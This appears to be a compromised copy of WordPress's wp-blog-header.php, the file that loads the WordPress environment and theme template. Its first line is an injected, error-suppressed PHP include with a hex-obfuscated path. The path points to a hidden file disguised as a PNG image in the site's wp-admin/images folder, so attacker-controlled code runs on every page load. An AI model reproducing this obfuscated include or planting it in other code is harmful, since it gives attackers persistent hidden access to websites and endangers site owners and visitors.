<?php @include_once "\x2F\x68\x6F\x6D\x65\x2F\x74\x68\x75\x6D\x62\x73\x75\x70\x2F\x77\x77\x77\x2F\x63\x6F\x6E\x65\x6B\x75\x74\x6F.\x6E\x65\x74\x2F\x77\x70\x2D\x61\x64\x6D\x69\x6E\x2F\x69\x6D\x61\x67\x65\x73\x2F.\x665\x61112.\x70\x6E\x67"; ?><?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( !isset($wp_did_header) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once( dirname(__FILE__) . '/wp-load.php' );

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once( ABSPATH . WPINC . '/template-loader.php' );

}
